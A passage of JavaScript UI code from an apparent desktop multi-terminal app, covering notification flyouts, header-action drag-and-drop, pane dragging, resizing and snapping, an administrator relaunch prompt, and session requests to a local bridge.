  if (restoreFocus && focusTarget?.isConnected) focusTarget.focus({ preventScroll: true });
}

function positionHeaderActionScopeFlyout(anchorRect) {
  const flyout = elements.headerActionScopeFlyout;
  const rect = flyout.getBoundingClientRect();
  const left = Math.max(8, Math.min(anchorRect.right - rect.width, window.innerWidth - rect.width - 8));
  const below = anchorRect.bottom + 8;
  const top = below + rect.height <= window.innerHeight - 8
    ? below
    : Math.max(8, anchorRect.top - rect.height - 8);
  flyout.style.left = `${left}px`;
  flyout.style.top = `${top}px`;
}

function showHeaderActionScopeFlyout(terminal, action, placement, anchor) {
  const destination = placement === "menu" ? "the hamburger menu" : "the terminal header";
  const label = HEADER_ACTIONS[action].label.replace("\u2026", "");
  const anchorRect = anchor.getBoundingClientRect();
  pendingHeaderActionMove = { terminalId: terminal.id, action, placement, focusTarget: anchor };
  elements.headerActionScopeTitle.textContent = `Move ${label}`;
  elements.headerActionScopeText.textContent = `Move this action to ${destination}?`;
  elements.headerActionScopeFlyout.querySelector('input[name="headerActionScope"][value="all"]').checked = true;
  elements.headerActionScopeRemember.checked = false;
  hideContextMenu();
  elements.headerActionScopeFlyout.hidden = false;
  refreshIcons(elements.headerActionScopeFlyout);
  positionHeaderActionScopeFlyout(anchorRect);
  elements.headerActionScopeApply.focus({ preventScroll: true });
}

function requestHeaderActionPlacement(terminal, action, placement, anchor) {
  if (headerActionPlacement(terminal, action) === placement) {
    hideContextMenu();
    return;
  }
  const rememberedScope = normalizeHeaderActionDragScope(state.settings.headerActionDragScope);
  if (rememberedScope !== "ask") {
    hideContextMenu();
    setHeaderActionPlacement(terminal.id, action, placement, rememberedScope);
    return;
  }
  showHeaderActionScopeFlyout(terminal, action, placement, anchor);
}

function bindHeaderActionCustomization() {
  elements.headerActionScopeCancel.addEventListener("click", () => closeHeaderActionScopeFlyout({ restoreFocus: true }));
  elements.headerActionScopeApply.addEventListener("click", () => {
    if (!pendingHeaderActionMove) return;
    const move = pendingHeaderActionMove;
    const selected = elements.headerActionScopeFlyout.querySelector('input[name="headerActionScope"]:checked')?.value || "all";
    if (elements.headerActionScopeRemember.checked) {
      state.settings.headerActionDragScope = selected;
      elements.headerActionDragScope.value = selected;
      elements.headerActionDragScope._combo?.sync();
      saveSettings();
    }
    closeHeaderActionScopeFlyout();
    setHeaderActionPlacement(move.terminalId, move.action, move.placement, selected);
  });
  elements.headerActionScopeFlyout.addEventListener("keydown", (event) => {
    if (event.key !== "Escape") return;
    event.preventDefault();
    closeHeaderActionScopeFlyout({ restoreFocus: true });
  });
  document.addEventListener("pointerdown", (event) => {
    if (!elements.headerActionScopeFlyout.hidden && !elements.headerActionScopeFlyout.contains(event.target)) {
      closeHeaderActionScopeFlyout();
    }
  }, true);
}

function terminalNotificationOverrideValue(terminal, channel) {
  const value = terminal?.notificationOverrides?.[channel];
  return typeof value === "boolean" ? (value ? "on" : "off") : "global";
}

function terminalNotificationSummary(terminal) {
  const labels = { activity: "Activity", idle: "Idle", bell: "Bell" };
  return Object.keys(TERMINAL_NOTIFICATION_SETTINGS).map((channel) => {
    const override = terminal?.notificationOverrides?.[channel];
    if (typeof override === "boolean") return `${labels[channel]}: ${override ? "On" : "Off"}`;
    return `${labels[channel]}: Global ${terminalNotificationEnabled(terminal, channel) ? "on" : "off"}`;
  }).join(" / ");
}

function replaceTerminalNotificationIcon(button, iconName) {
  if (!button || button.dataset.notificationIcon === iconName) return;
  const icon = document.createElement("i");
  icon.dataset.lucide = iconName;
  button.replaceChildren(icon);
  button.dataset.notificationIcon = iconName;
  refreshIcons(button);
}

function updateTerminalNotificationButton(terminal) {
  const buttons = terminal?.pane?.querySelectorAll('button[data-action="notifications"], button[data-action="notifications-compact"]');
  if (!buttons?.length) return;
  const hasOverride = Object.keys(terminal.notificationOverrides).length > 0;
  const anyEnabled = Object.keys(TERMINAL_NOTIFICATION_SETTINGS)
    .some((channel) => terminalNotificationEnabled(terminal, channel));
  const stateName = hasOverride ? (anyEnabled ? "enabled" : "muted") : "global";
  const summary = terminalNotificationSummary(terminal);
  for (const button of buttons) {
    button.dataset.notificationState = stateName;
    replaceTerminalNotificationIcon(button, hasOverride ? (anyEnabled ? "bell-ring" : "bell-off") : "bell");
    button.title = `Notifications - ${summary}`;
    button.setAttribute("aria-label", `Notifications for ${terminal.titleInput.value || "terminal"}. ${summary}`);
  }
}

function renderTerminalNotificationFlyout() {
  const terminal = state.terminals.get(terminalNotificationFlyoutId);
  if (!terminal) {
    closeTerminalNotificationFlyout();
    return;
  }
  elements.terminalNotificationSubtitle.textContent = terminal.titleInput.value || "Terminal";
  elements.terminalNotificationGlobalSummary.textContent = [
    `Global: Activity ${state.settings.notifyActivity ? "on" : "off"}`,
    `Idle ${state.settings.notifySilence ? "on" : "off"} (${Math.max(2, Number(state.settings.silenceSeconds) || 10)}s)`,
    `Bell ${state.settings.bellNotify ? "on" : "off"}`
  ].join(" / ");
  for (const row of elements.terminalNotificationFlyout.querySelectorAll("[data-notification-channel]")) {
    const selected = terminalNotificationOverrideValue(terminal, row.dataset.notificationChannel);
    for (const button of row.querySelectorAll("[data-notification-value]")) {
      const checked = button.dataset.notificationValue === selected;
      button.setAttribute("aria-checked", String(checked));
      button.tabIndex = checked ? 0 : -1;
    }
  }
  elements.terminalNotificationReset.disabled = Object.keys(terminal.notificationOverrides).length === 0;
}

function positionTerminalNotificationFlyout(anchor) {
  const flyout = elements.terminalNotificationFlyout;
  const anchorRect = anchor.getBoundingClientRect();
  flyout.classList.add("is-positioning");
  flyout.hidden = false;
  flyout.style.left = "0px";
  flyout.style.top = "0px";
  const rect = flyout.getBoundingClientRect();
  const left = Math.max(8, Math.min(anchorRect.right - rect.width, window.innerWidth - rect.width - 8));
  const below = anchorRect.bottom + 7;
  const top = below + rect.height <= window.innerHeight - 8
    ? below
    : Math.max(8, anchorRect.top - rect.height - 7);
  flyout.style.left = `${left}px`;
  flyout.style.top = `${top}px`;
  flyout.classList.remove("is-positioning");
}

function openTerminalNotificationFlyout(terminal, anchor) {
  closeHeaderActionScopeFlyout();
  hideContextMenu();
  if (terminalNotificationFlyoutAnchor && terminalNotificationFlyoutAnchor !== anchor) {
    terminalNotificationFlyoutAnchor.setAttribute("aria-expanded", "false");
  }
  terminalNotificationFlyoutId = terminal.id;
  terminalNotificationFlyoutAnchor = anchor;
  if (anchor.getAttribute("aria-haspopup") === "dialog") anchor.setAttribute("aria-expanded", "true");
  renderTerminalNotificationFlyout();
  refreshIcons(elements.terminalNotificationFlyout);
  positionTerminalNotificationFlyout(anchor);
  elements.terminalNotificationFlyout.querySelector('[aria-checked="true"]')?.focus({ preventScroll: true });
}

function closeTerminalNotificationFlyout({ restoreFocus = false } = {}) {
  const anchor = terminalNotificationFlyoutAnchor;
  elements.terminalNotificationFlyout.hidden = true;
  terminalNotificationFlyoutId = null;
  terminalNotificationFlyoutAnchor = null;
  if (anchor?.getAttribute("aria-haspopup") === "dialog") anchor.setAttribute("aria-expanded", "false");
  if (restoreFocus && anchor?.isConnected) anchor.focus({ preventScroll: true });
}

function toggleTerminalNotificationFlyout(terminal, anchor) {
  if (terminalNotificationFlyoutId === terminal.id && terminalNotificationFlyoutAnchor === anchor
      && !elements.terminalNotificationFlyout.hidden) {
    closeTerminalNotificationFlyout({ restoreFocus: true });
    return;
  }
  openTerminalNotificationFlyout(terminal, anchor);
}

function setTerminalNotificationOverride(channel, value) {
  const terminal = state.terminals.get(terminalNotificationFlyoutId);
  if (!terminal || !Object.prototype.hasOwnProperty.call(TERMINAL_NOTIFICATION_SETTINGS, channel)) return;
  if (value === "global") delete terminal.notificationOverrides[channel];
  else if (value === "on" || value === "off") terminal.notificationOverrides[channel] = value === "on";
  else return;
  if (channel === "idle" && !terminalNotificationEnabled(terminal, "idle")) {
    window.clearTimeout(terminal.silenceTimer);
    terminal.hadOutput = false;
  }
  if (value === "on" && "Notification" in window && Notification.permission === "default") {
    Notification.requestPermission();
  }
  updateTerminalNotificationButton(terminal);
  renderTerminalNotificationFlyout();
  saveSessionSnapshot();
}

function bindTerminalNotificationFlyout() {
  elements.terminalNotificationFlyout.addEventListener("click", (event) => {
    const button = event.target.closest("button[data-notification-value]");
    const row = button?.closest("[data-notification-channel]");
    if (!button || !row) return;
    setTerminalNotificationOverride(row.dataset.notificationChannel, button.dataset.notificationValue);
  });
  elements.terminalNotificationFlyout.addEventListener("keydown", (event) => {
    if (event.key === "Escape") {
      event.preventDefault();
      closeTerminalNotificationFlyout({ restoreFocus: true });
      return;
    }
    if (!["ArrowLeft", "ArrowRight", "ArrowUp", "ArrowDown"].includes(event.key)) return;
    const current = event.target.closest("button[data-notification-value]");
    if (!current) return;
    const buttons = [...current.parentElement.querySelectorAll("button[data-notification-value]")];
    const delta = event.key === "ArrowRight" || event.key === "ArrowDown" ? 1 : -1;
    const next = buttons[(buttons.indexOf(current) + delta + buttons.length) % buttons.length];
    event.preventDefault();
    next.click();
    next.focus({ preventScroll: true });
  });
  elements.terminalNotificationReset.addEventListener("click", () => {
    const terminal = state.terminals.get(terminalNotificationFlyoutId);
    if (!terminal) return;
    terminal.notificationOverrides = {};
    if (!terminalNotificationEnabled(terminal, "idle")) {
      window.clearTimeout(terminal.silenceTimer);
      terminal.hadOutput = false;
    }
    updateTerminalNotificationButton(terminal);
    renderTerminalNotificationFlyout();
    saveSessionSnapshot();
  });
  document.addEventListener("pointerdown", (event) => {
    if (elements.terminalNotificationFlyout.hidden) return;
    if (elements.terminalNotificationFlyout.contains(event.target) || terminalNotificationFlyoutAnchor?.contains(event.target)) return;
    closeTerminalNotificationFlyout();
  }, true);
  document.addEventListener("keydown", (event) => {
    if (event.key !== "Escape" || elements.terminalNotificationFlyout.hidden) return;
    event.preventDefault();
    event.stopPropagation();
    closeTerminalNotificationFlyout({ restoreFocus: true });
  }, true);
  window.addEventListener("resize", () => {
    if (!elements.terminalNotificationFlyout.hidden) closeTerminalNotificationFlyout();
  });
}

function runHeaderAction(terminal, action) {
  if (action === "close") {
    removeTerminal(terminal.id);
  } else if (action === "focus") {
    clearSnapLayout(false);
    state.settings.layout = "focus";
    elements.layoutMode.value = "focus";
    setPrimaryTerminal(terminal.id);
    setActiveTerminal(terminal.id);
    applySettings();
    saveSettings();
    revealTerminal(terminal);
    terminal.term.focus();
  } else if (action === "clear") {
    clearTerminal(terminal.id);
  } else if (action === "copy") {
    copyTerminalOutput(terminal.id);
  } else if (action === "color") {
    cyclePaneColor(terminal);
  } else if (action === "find") {
    openFind(terminal);
  } else if (action === "restart") {
    restartSession(terminal.id);
  } else if (action === "dequeue") {
    dequeueNextTerminalCommand(terminal);
  } else if (action === "artifacts") {
    openTerminalArtifacts(terminal.id);
  } else if (action === "maximize") {
    toggleZoomPane(terminal.id);
  } else if (action === "minimize") {
    minimizeTerminal(terminal.id);
  } else if (action === "duplicate") {
    addTerminal({
      reveal: true,
      runStartup: true,
      title: `${terminal.titleInput.value} copy`,
      copilotCwd: terminal.copilotCwd,
      fontSizeOverride: terminal.fontSizeOverride,
      headerActionOverrides: { ...terminal.headerActionOverrides },
      notificationOverrides: { ...terminal.notificationOverrides }
    });
  } else if (action === "move-left") {
    moveTerminal(terminal.id, -1);
  } else if (action === "move-right") {
    moveTerminal(terminal.id, 1);
  }
}

function bindPaneControls(terminal) {
  terminal.titleInput.addEventListener("change", () => {
    commitTerminalTitle(terminal, terminal.titleInput.value);
  });

  terminal.titleInput.addEventListener("keydown", (event) => {
    if (event.key !== "Enter" || event.isComposing) return;
    event.preventDefault();
    event.stopPropagation();
    terminal.titleInput.blur();
  });

  const paneActions = terminal.pane.querySelector(".pane-actions");
  paneActions.addEventListener("click", (event) => {
    const button = event.target.closest("button");
    if (!button) return;

    const action = button.dataset.action;
    if (action === "more") {
      setActiveTerminal(terminal.id);
      showPaneOverflowMenu(button, terminal);
    } else if (action === "notifications") {
      setActiveTerminal(terminal.id);
      toggleTerminalNotificationFlyout(terminal, button);
    } else if (HEADER_ACTION_ID_SET.has(action)) {
      runHeaderAction(terminal, action);
    }
  });

  const compactNotifications = terminal.pane.querySelector('button[data-action="notifications-compact"]');
  compactNotifications.addEventListener("click", () => {
    setActiveTerminal(terminal.id);
    toggleTerminalNotificationFlyout(terminal, compactNotifications);
  });

  paneActions.addEventListener("dragstart", (event) => {
    const button = event.target.closest("button[data-action]");
    const action = button?.dataset.action;
    if (!button || !HEADER_ACTION_ID_SET.has(action)) return;
    startHeaderActionDrag(event, terminal.id, action, button);
  });
  paneActions.addEventListener("dragend", finishHeaderActionDrag);
  paneActions.addEventListener("dragover", (event) => {
    if (!draggedHeaderAction || draggedHeaderAction.terminalId !== terminal.id) return;
    const more = event.target.closest('button[data-action="more"]');
    const destination = more ? "menu" : "header";
    if (headerActionPlacement(terminal, draggedHeaderAction.action) === destination) return;
    event.preventDefault();
    clearHeaderActionDragStyles();
    (more || paneActions).classList.add("is-header-action-drop-target");
    if (event.dataTransfer) event.dataTransfer.dropEffect = "move";
  });
  paneActions.addEventListener("dragleave", (event) => {
    if (paneActions.contains(event.relatedTarget)) return;
    clearHeaderActionDragStyles();
  });
  paneActions.addEventListener("drop", (event) => {
    if (!draggedHeaderAction || draggedHeaderAction.terminalId !== terminal.id) return;
    const more = event.target.closest('button[data-action="more"]');
    const destination = more ? "menu" : "header";
    if (headerActionPlacement(terminal, draggedHeaderAction.action) === destination) return;
    event.preventDefault();
    const action = draggedHeaderAction.action;
    clearHeaderActionDragStyles();
    requestHeaderActionPlacement(terminal, action, destination, more || paneActions);
  });

  // The elapsed time in the tooltip is only correct at the instant it is built,
  // so build it when the pointer arrives rather than leaving a stale one behind.
  terminal.statusElement.addEventListener("pointerenter", () => {
    refreshStatusPillTooltip(terminal);
  });

  // Without this the pane's own handler wins, and with "right-click pastes"
  // configured that would dump the clipboard into the shell — an odd thing for
  // a status readout to do. Right-click here reports on the session instead.
  terminal.statusElement.addEventListener("contextmenu", (event) => {
    event.preventDefault();
    event.stopPropagation();
    setActiveTerminal(terminal.id);
    showSessionInfoMenu(terminal);
  });
}

function commitTerminalTitle(terminal, rawTitle, notifyBridge = true) {
  if (!terminal) return;
  const title = typeof rawTitle === "string" && rawTitle.trim() ? rawTitle.trim() : terminalShellTitle(terminal.shell);
  terminal.titleInput.value = title;
  terminal.titleDisplay.textContent = title;
  const analytics = state.analytics.terminals[terminal.id];
  if (analytics) {
    analytics.title = title;
    scheduleTerminalAnalyticsSave();
    renderTerminalAnalytics();
  }
  if (state.terminalArtifacts.terminals[terminal.id]) syncTerminalArtifacts(terminal);
  refreshTerminalSearchText(terminal);
  updateTerminalSearchVisibility(terminal);
  updateTerminalConnectionViews();
  updateMinimizedDock();
  updateTerminalNotificationButton(terminal);
  if (terminalNotificationFlyoutId === terminal.id) renderTerminalNotificationFlyout();
  saveSessionSnapshot();
  if (notifyBridge) sendBridge({ type: "title", id: terminal.id, title });
}

function bindPaneDrag(terminal) {
  const handle = terminal.pane.querySelector(".pane-bar");
  let drag = null;

  const onMove = (event) => {
    if (!drag || drag.pointerId !== event.pointerId) return;

    const deltaX = event.clientX - drag.startX;
    const deltaY = event.clientY - drag.startY;
    if (!drag.started && Math.hypot(deltaX, deltaY) < 8) return;

    if (!drag.started) {
      drag.started = true;
      terminal.titleInput.blur();
      terminal.pane.classList.add("is-dragging");
      document.body.classList.add("is-pane-dragging");
    }

    const pageChip = pageChipUnderPoint(event.clientX, event.clientY, terminal.pageId);
    setPanePageDropTarget(drag, pageChip);
    if (pageChip) {
      drag.edge = null;
      setSnapPreview(null);
      clearPaneLift(terminal.pane, drag);
      return;
    }

    const active = getSnapEdges(event.clientX, event.clientY);
    for (const edge of drag.suppressEdges) {
      if (!active.includes(edge)) drag.suppressEdges.delete(edge);
    }
    drag.edge = active.find((edge) => !drag.suppressEdges.has(edge)) ?? null;
    setSnapPreview(drag.edge);

    if (state.settings.layout === "manual") {
      if (!drag.edge) {
        const layout = ensureManualLayout(terminal.id);
        const zoom = workspaceZoomScale();
        layout.x = Math.max(0, drag.x + deltaX / zoom);
        layout.y = Math.max(0, drag.y + deltaY / zoom);
        applyManualLayout(terminal, layout);
      }
      return;
    }

    // Every non-manual layout positions panes by DOM order, so dragging one over
    // its neighbours can rearrange the grid live. An edge snap takes priority:
    // while one is previewed the pane drops back into its slot so the preview
    // reads as the outcome.
    if (drag.edge) {
      clearPaneLift(terminal.pane, drag);
      return;
    }

    if (reorderPaneDuringDrag(terminal.pane, drag, event.clientX, event.clientY)) {
      drag.reordered = true;
    }
    liftPane(terminal.pane, drag, event.clientX, event.clientY);
  };

  const onUp = (event) => {
    if (!drag || drag.pointerId !== event.pointerId) return;
    stopTracking();
    finishPaneDrag(terminal, drag);
    drag = null;
  };

  const onCancel = (event) => {
    if (!drag || drag.pointerId !== event.pointerId) return;
    stopTracking();
    endPaneDrag(terminal);
    drag = null;
  };

  function stopTracking() {
    window.removeEventListener("pointermove", onMove);
    window.removeEventListener("pointerup", onUp);
    window.removeEventListener("pointercancel", onCancel);
  }

  handle.addEventListener("pointerdown", (event) => {
    if (event.button !== 0 || event.target.closest("button,select")) return;

    const layout = ensureManualLayout(terminal.id);
    const rect = terminal.pane.getBoundingClientRect();
    drag = {
      edge: null,
      grabX: event.clientX - rect.left,
      grabY: event.clientY - rect.top,
      pointerId: event.pointerId,
      pageId: null,
      reordered: false,
      started: false,
      originalOrder: [...elements.host.children].map((pane) => pane.dataset.id),
      startX: event.clientX,
      startY: event.clientY,
      // Pane bars run along the top of each pane, so grabbing one in the top row
      // or left column puts the pointer inside a snap zone before the drag has
      // gone anywhere - and a top-row bar never leaves the top zone while being
      // dragged sideways. Every edge the pointer already occupies is disarmed and
      // re-armed individually once the pointer leaves it, so a pane can still be
      // rearranged along the edge it started on while the other edges stay live.
      suppressEdges: new Set(getSnapEdges(event.clientX, event.clientY)),
      tx: 0,
      ty: 0,
      x: layout.x,
      y: layout.y
    };

    // Pointer capture is deliberately not used: rearranging re-inserts the pane,
    // and re-inserting an element releases its capture, which would strand the
    // drag with the pane still lifted. Tracking on the window survives that and
    // also catches a release that happens off the bar.
    stopTracking();
    window.addEventListener("pointermove", onMove);
    window.addEventListener("pointerup", onUp);
    window.addEventListener("pointercancel", onCancel);
  });
}

let paneResizeActive = false;

function bindPaneResize(terminal) {
  const handles = terminal.pane.querySelectorAll(".pane-resize-handle");
  let resize = null;

  const stopTracking = () => {
    window.removeEventListener("pointermove", onMove);
    window.removeEventListener("pointerup", onEnd);
    window.removeEventListener("pointercancel", onEnd);
  };

  const onMove = (event) => {
    if (!resize || resize.pointerId !== event.pointerId) return;
    const zoom = workspaceZoomScale();
    const deltaX = (event.clientX - resize.startX) / zoom;
    const deltaY = (event.clientY - resize.startY) / zoom;
    const next = {
      x: resize.x,
      y: resize.y,
      w: resize.w,
      h: resize.h
    };

    if (resize.direction.includes("e")) {
      next.w = Math.max(resize.minWidth, resize.w + deltaX);
    } else if (resize.direction.includes("w")) {
      const right = resize.x + resize.w;
      next.x = Math.max(0, Math.min(resize.x + deltaX, right - resize.minWidth));
      next.w = right - next.x;
    }
    if (resize.direction.includes("s")) {
      next.h = Math.max(resize.minHeight, resize.h + deltaY);
    } else if (resize.direction.includes("n")) {
      const bottom = resize.y + resize.h;
      next.y = Math.max(0, Math.min(resize.y + deltaY, bottom - resize.minHeight));
      next.h = bottom - next.y;
    }

    const layout = ensureManualLayout(terminal.id);
    layout.x = Math.round(next.x);
    layout.y = Math.round(next.y);
    layout.w = Math.round(next.w);
    layout.h = Math.round(next.h);
    applyManualLayout(terminal, layout);
  };

  const onEnd = (event) => {
    if (!resize || resize.pointerId !== event.pointerId) return;
    stopTracking();
    resize = null;
    paneResizeActive = false;
    terminal.pane.classList.remove("is-resizing");
    document.body.classList.remove("is-pane-resizing");
    document.body.style.removeProperty("cursor");
    syncManualLayout(terminal);
  };

  for (const handle of handles) {
    handle.addEventListener("pointerdown", (event) => {
      if (event.button !== 0 || state.settings.layout !== "manual") return;
      event.preventDefault();
      event.stopPropagation();
      const layout = ensureManualLayout(terminal.id);
      const rect = terminal.pane.getBoundingClientRect();
      const style = getComputedStyle(terminal.pane);
      const zoom = workspaceZoomScale();
      resize = {
        direction: handle.dataset.resize || "se",
        h: rect.height / zoom,
        minHeight: Number.parseFloat(style.minHeight) || 180,
        minWidth: Number.parseFloat(style.minWidth) || 260,
        pointerId: event.pointerId,
        startX: event.clientX,
        startY: event.clientY,
        w: rect.width / zoom,
        x: Number(layout.x) || 0,
        y: Number(layout.y) || 0
      };
      paneResizeActive = true;
      setActiveTerminal(terminal.id);
      terminal.pane.classList.add("is-resizing");
      document.body.classList.add("is-pane-resizing");
      document.body.style.cursor = getComputedStyle(handle).cursor;
      stopTracking();
      window.addEventListener("pointermove", onMove);
      window.addEventListener("pointerup", onEnd);
      window.addEventListener("pointercancel", onEnd);
    });
  }
}

function finishPaneDrag(terminal, drag) {
  if (drag.started && drag.pageId) {
    if (drag.reordered) restorePaneOrder(drag.originalOrder);
    if (state.snap?.id === terminal.id) clearSnapLayout(false);
    moveTerminalToPage(terminal.id, drag.pageId);
  } else if (drag.started && drag.edge) {
    snapTerminal(terminal.id, drag.edge);
  } else if (drag.started && state.settings.layout === "manual") {
    clearSnapLayout(false);
    syncManualLayout(terminal);
    saveManualLayouts();
  } else if (drag.started && state.snap?.id === terminal.id) {
    clearSnapLayout(true);
  } else if (drag.started && drag.reordered) {
    syncTerminalOrderToDom();
    saveSessionSnapshot();
    fitAllTerminals();
  }

  endPaneDrag(terminal);
}

// The pane tracks the cursor by transform rather than by layout, so the grid can
// keep reflowing underneath it. The offset is corrected against the pane's live
// rect each move instead of accumulated from the drag origin, which keeps the
// grab point under the cursor even after a reorder moves the pane's home slot.
function liftPane(pane, drag, x, y) {
  const rect = pane.getBoundingClientRect();
  const zoom = workspaceZoomScale();
  drag.tx += (x - (rect.left + drag.grabX)) / zoom;
  drag.ty += (y - (rect.top + drag.grabY)) / zoom;
  pane.style.transform = `translate(${drag.tx}px, ${drag.ty}px)`;
  scheduleTerminalConnections();
}

function clearPaneLift(pane, drag) {
  drag.tx = 0;
  drag.ty = 0;
  pane.style.transform = "";
  scheduleTerminalConnections();
}

function paneUnderPoint(x, y, exclude) {
  for (const terminal of state.terminals.values()) {
    if (terminal.pane === exclude || terminal.minimized) continue;
    const rect = terminal.pane.getBoundingClientRect();
    if (x >= rect.left && x <= rect.right && y >= rect.top && y <= rect.bottom) {
      return terminal.pane;
    }
  }
  return null;
}

// Moves the dragged pane past whichever pane the cursor is over. The swap only
// commits once the cursor crosses that pane's midpoint on the axis the two are
// separated along, so resting near a shared edge cannot oscillate.
function reorderPaneDuringDrag(pane, drag, x, y) {
  const target = paneUnderPoint(x, y, pane);
  if (!target) return false;

  const targetRect = target.getBoundingClientRect();
  const paneRect = pane.getBoundingClientRect();
  const zoom = workspaceZoomScale();
  const horizontal =
    Math.abs(targetRect.left - (paneRect.left - drag.tx * zoom)) >=
    Math.abs(targetRect.top - (paneRect.top - drag.ty * zoom));
  const pointer = horizontal ? x : y;
  const midpoint = horizontal
    ? targetRect.left + targetRect.width / 2
    : targetRect.top + targetRect.height / 2;
  const targetIsEarlier = Boolean(
    target.compareDocumentPosition(pane) & Node.DOCUMENT_POSITION_FOLLOWING
  );

  if (targetIsEarlier ? pointer > midpoint : pointer < midpoint) return false;

  const before = capturePaneRects(pane);
  if (targetIsEarlier) {
    elements.host.insertBefore(pane, target);
  } else {
    elements.host.insertBefore(pane, target.nextElementSibling);
  }
  animatePaneShuffle(before, pane);
  return true;
}

function capturePaneRects(exclude) {
  const rects = [];
  for (const terminal of state.terminals.values()) {
    if (terminal.pane === exclude || terminal.minimized) continue;
    rects.push([terminal.pane, terminal.pane.getBoundingClientRect()]);
  }
  return rects;
}

// A grid reflow snaps panes to their new cells with no motion, so displaced panes
// are animated the FLIP way: put each one back where it was, then let the normal
// transform transition carry it to its new home.
function animatePaneShuffle(before, exclude) {
  const moved = [];

  for (const [pane, first] of before) {
    if (pane === exclude) continue;

    const last = pane.getBoundingClientRect();
    const dx = first.left - last.left;
    const dy = first.top - last.top;
    if (!dx && !dy) continue;

    pane.style.transition = "none";
    pane.style.transform = `translate(${dx}px, ${dy}px)`;
    moved.push(pane);
  }

  if (!moved.length) return;

  // One flush for the whole batch. Reading a layout property forces the inverted
  // positions to take effect before they are cleared; without it both writes land
  // in the same frame and only the final one is painted, so nothing animates.
  // Reading once here rather than per pane keeps a wide reshuffle to a single
  // forced reflow.
  void elements.host.offsetWidth;

  for (const pane of moved) {
    pane.style.transition = "";
    pane.style.transform = "";
  }
  trackTerminalConnectionAnimation(240);
}

// Grid order is DOM order, but the session snapshot is written from the terminal
// map, so the map is realigned after a rearrange to keep a restored session in
// the order the user left it.
function syncTerminalOrderToDom() {
  const ordered = [];
  for (const pane of elements.host.children) {
    const terminal = state.terminals.get(pane.dataset.id);
    if (terminal) ordered.push(terminal);
  }
  if (ordered.length !== state.terminals.size) return;

  state.terminals.clear();
  for (const terminal of ordered) state.terminals.set(terminal.id, terminal);
}

function restorePaneOrder(order) {
  if (!Array.isArray(order)) return;
  const panes = new Map([...elements.host.children].map((pane) => [pane.dataset.id, pane]));
  for (const id of order) {
    const pane = panes.get(id);
    if (pane) elements.host.append(pane);
  }
  syncTerminalOrderToDom();
}

function pageChipUnderPoint(x, y, sourcePageId) {
  for (const chip of elements.pagerList?.querySelectorAll(".pager-chip") || []) {
    if (chip.dataset.pageId === sourcePageId || chip.offsetParent === null) continue;
    const rect = chip.getBoundingClientRect();
    if (x >= rect.left && x <= rect.right && y >= rect.top && y <= rect.bottom) return chip;
  }
  return null;
}

function setPanePageDropTarget(drag, chip) {
  const pageId = chip?.dataset.pageId || null;
  if (drag.pageId === pageId) return;
  for (const candidate of elements.pagerList?.querySelectorAll(".is-pane-page-drop-target") || []) {
    candidate.classList.remove("is-pane-page-drop-target");
  }
  drag.pageId = pageId;
  chip?.classList.add("is-pane-page-drop-target");
}

function endPaneDrag(terminal) {
  terminal.pane.style.transform = "";
  terminal.pane.classList.remove("is-dragging");
  document.body.classList.remove("is-pane-dragging");
  for (const chip of elements.pagerList?.querySelectorAll(".is-pane-page-drop-target") || []) {
    chip.classList.remove("is-pane-page-drop-target");
  }
  setSnapPreview(null);
}

// Returns every host edge the pointer is currently within snapping distance of,
// in priority order. A corner yields two, which is what lets the drag suppress
// exactly the edges it started in without disarming the others.
function getSnapEdges(clientX, clientY) {
  const rect = elements.host.getBoundingClientRect();
  const threshold = Math.min(48, Math.max(24, Math.min(rect.width, rect.height) * 0.08));
  const edges = [];

  if (clientX <= rect.left + threshold) {
    edges.push("left");
  } else if (clientX >= rect.right - threshold) {
    edges.push("right");
  }

  if (clientY <= rect.top + threshold) {
    edges.push("top");
  } else if (clientY >= rect.bottom - threshold) {
    edges.push("bottom");
  }

  return edges;
}

function setSnapPreview(edge) {
  if (edge) {
    elements.snapPreview.dataset.edge = edge;
  } else {
    delete elements.snapPreview.dataset.edge;
  }
}

function snapTerminal(id, edge) {
  if (!state.terminals.has(id)) return;

  state.snap = { edge, id };
  applySnapLayout();
  fitAllTerminals();
}

function clearSnapLayout(shouldFit) {
  if (!state.snap) return;

  state.snap = null;
  applySnapLayout();
  if (shouldFit) {
    fitAllTerminals();
  }
}

/* ---------------- Administrator elevation --------------- */

async function refreshElevationStatus() {
  if (!window.multiterm || typeof window.multiterm.isElevated !== "function") return;
  try {
    state.appElevated = await window.multiterm.isElevated();
  } catch {
    state.appElevated = false;
  }
  applyElevationBadge();
}

function applyElevationBadge() {
  document.body.classList.toggle("app-elevated", Boolean(state.appElevated));
  if (elements.statusAdmin) elements.statusAdmin.hidden = !state.appElevated;
}

async function restartAsAdmin() {
  if (state.appElevated) { toast("Already running as administrator", "info", 1800); return; }
  if (!window.multiterm || typeof window.multiterm.restartAsAdmin !== "function") {
    toast("Administrator relaunch is only available in the desktop app", "error", 3000);
    return;
  }
  toast("Relaunching as administrator \u2014 approve the UAC prompt\u2026", "info", 3000);
  try {
    const ok = await window.multiterm.restartAsAdmin();
    if (!ok) toast("Could not relaunch as administrator", "error");
  } catch {
    toast("Could not relaunch as administrator", "error");
  }
}

function requestSession(terminal) {
  if (!state.socketReady) {
    terminal.remoteRequested = false;
    setTerminalStatus(terminal, "waiting", "dead");
    writelnTerminal(terminal, "\x1b[33mWaiting for local bridge.\x1b[0m");
    log.warn("session", `Bridge not ready; deferring session for ${terminal.titleInput.value}`, { id: terminal.id });
    return;
  }

  terminal.remoteRequested = true;
  // The old process's keyboard-protocol negotiation dies with it.
  terminal.modifyOtherKeys = 0;
  setTerminalStatus(terminal, "starting", "dead");
  log.debug("session", `Requesting session: ${terminal.titleInput.value}`, { id: terminal.id, shell: terminal.shell || elements.shellSelect.value });
  if (terminal.elevated) {
    sendBridge({
      type: "elevate",
      cols: terminal.term.cols,
      cwd: terminal.cwd || elements.cwdInput.value,
      id: terminal.id,
      rows: terminal.term.rows,
      shell: terminal.shell || elements.shellSelect.value,
      title: terminal.titleInput.value
    });
    return;
  }
  sendBridge({
    type: "create",
    cols: terminal.term.cols,
    cwd: terminal.cwd || elements.cwdInput.value,
    id: terminal.id,
    rows: terminal.term.rows,
    shell: terminal.shell || elements.shellSelect.value,
    title: terminal.titleInput.value,
    elevated: Boolean(terminal.elevated),
    tmux: terminal.tmux
  });
}

function removeTerminal(id) {
  const terminal = state.terminals.get(id);
  if (!terminal) return false;

  if (!sendBridge({ type: "kill", id }) && terminal.remoteRequested) {
    setBridgeStatus("Bridge unavailable; session still running", "offline");
    log.warn("terminal", `Cannot close ${terminal.titleInput.value}; bridge unavailable`, { id });
    updateTerminalActions();
    return false;
  }

